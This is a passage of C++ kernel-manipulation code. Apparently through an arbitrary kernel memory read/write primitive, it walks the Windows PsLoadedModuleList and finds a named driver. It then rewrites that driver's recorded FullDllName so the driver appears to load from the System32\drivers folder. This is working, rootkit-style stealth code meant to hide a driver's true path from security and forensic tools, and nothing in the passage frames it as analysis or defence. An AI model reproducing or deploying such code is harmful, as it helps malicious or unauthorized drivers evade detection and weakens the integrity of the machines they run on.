        km_log::Step("disguising the recorded path for %ls", wanted.c_str());

        const uint64_t kernelBase = nal::ResolveKernelBase();

        if (!kernelBase)
        {
            km_log::Warn("kernel base unresolved - host keeps its real path");
            return false;
        }

        const uint64_t list = nal::GetKernelModuleExport(kernelBase, "PsLoadedModuleList");

        if (!list || !Mapped(list, 0x10))
        {
            km_log::Warn("PsLoadedModuleList unresolved - host keeps its real path");
            return false;
        }

        uint64_t head = 0;
        uint32_t walked = 0;

        if (!nal::ReadMemory(list, &head, sizeof(head)))
        {
            km_log::Warn("disguise: cannot read the module list head");
            return false;
        }

        for (uint32_t guard = 0; head && head != list && guard < kMaxNodes; ++guard)
        {
            const uint64_t entry = head;
            uint64_t dllBase = 0;
            std::wstring name;

            ++walked;

            /* The cursor comes out of the list, so it is only as trustworthy as the
             * entry that produced it. */
            if (!Mapped(entry, 0x60))
            {
                km_log::Warn("disguise: entry 0x%llX is not a kernel range",
                             (unsigned long long)entry);
                return false;
            }

            if (!nal::ReadMemory(entry + kLdrNext, &head, sizeof(head)))
            {
                km_log::Warn("disguise: walk broke at 0x%llX", (unsigned long long)entry);
                return false;
            }

            if (!nal::ReadMemory(entry + kLdrDllBase, &dllBase, sizeof(dllBase)) ||
                !Mapped(dllBase, 0x1000))
                continue;

            if (!ReadUnicodeName(entry + kLdrBaseName, &name) || !SameName(name, wanted))
                continue;

            const std::wstring disguised =
                std::wstring(L"\\SystemRoot\\System32\\drivers\\") + wanted;
            const uint32_t bytes = (uint32_t)(disguised.size() * sizeof(wchar_t));

            const uint64_t buffer = nal::AllocatePool(bytes + sizeof(wchar_t));

            if (!buffer)
            {
                km_log::Warn("disguise: cannot allocate the name buffer");
                return false;
            }

            if (!nal::WriteMemory(buffer, (void*)disguised.c_str(), bytes + sizeof(wchar_t)))
            {
                km_log::Warn("disguise: cannot write the name buffer at 0x%llX",
                             (unsigned long long)buffer);
                return false;
            }

            uint8_t descriptor[0x10] = { 0 };
            *(uint16_t*)(descriptor + 0x00) = (uint16_t)bytes;
            *(uint16_t*)(descriptor + 0x02) = (uint16_t)(bytes + sizeof(wchar_t));
            *(uint64_t*)(descriptor + 0x08) = buffer;

            if (!nal::WriteMemory(entry + kLdrFullDllName, descriptor, sizeof(descriptor)))
            {
                km_log::Warn("disguise: cannot rewrite the entry at 0x%llX",
                             (unsigned long long)entry);
                return false;
            }

            km_log::Good("host now reported as %ls", disguised.c_str());
            return true;
        }

        km_log::Warn("host entry not found in PsLoadedModuleList (%u entries walked)", walked);
        return false;
    }
}
